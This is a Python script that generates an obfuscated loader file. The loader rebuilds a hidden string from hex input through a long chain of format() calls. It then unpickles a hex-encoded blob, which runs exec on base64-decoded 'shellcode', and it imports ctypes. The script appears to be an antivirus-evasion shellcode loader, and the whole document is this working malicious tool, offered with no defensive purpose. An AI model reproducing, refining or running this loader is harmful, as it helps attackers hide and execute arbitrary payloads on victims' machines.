import os
import random

def getRandomStr():
    chars = '霖阿什顿操大撒德哈卡我被哈韩牛按客户都是嗷对啊空间很聪安徽的abcdefghigklmnopqrstu';
    charLen = len(chars)
    pwd = ''
    resultLen = random.randint(5, 9)
    while len(pwd) < resultLen:
        pwd += chars[random.randint(0,charLen-1)]
    return pwd

x=open("fliename.txt")
e=x.readlines()
x.close()
shellname=e[0]

f=open("hex.txt")
a=f.readlines()
f.close()
neiro="""import requests
import pickle
import sys
import base64
import string
import re
import os
import base64
import ctypes
global code
code=[]
code={0}""".format(a)+"""
a=re.findall("(\w)",code[1])
def decode_string():
    n=0
    x=0
    bianliang=code[0]
    words=a
    counts=int(code[2])
    for key in words:
        global num
        num = 0
        def number():
            global num
            num = num + 1
            return str(num)
        bianliang=bianliang.format(words[0],"{"+str(x)+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}"
                                   ,"{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}"
                                   ,"{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}"
                                   ,"{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}"
                                   ,"{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}"
                                   ,"{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}"
                                   ,"{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}","{"+number()+"}"
                                   )
        try:
            words[0] = words[n+1]
        except:
            pass
        n = n + 1
        if n>counts:
            break
    return bianliang

shellcode=str(decode_string())
code1="8003636275696{0}74696{2}730{1}657865630{1}710058230000002865786563286261736536342{2}6236346465636{3}6465287368656{0}6{0}636{3}646529292971018571025271032{2}".format("c","a","e","f")
a1=bytes.fromhex(code1)
pickle.loads(a1)
"""
w=open('{0}.py'.format(shellname),'w+')
w.write(neiro)
w.close()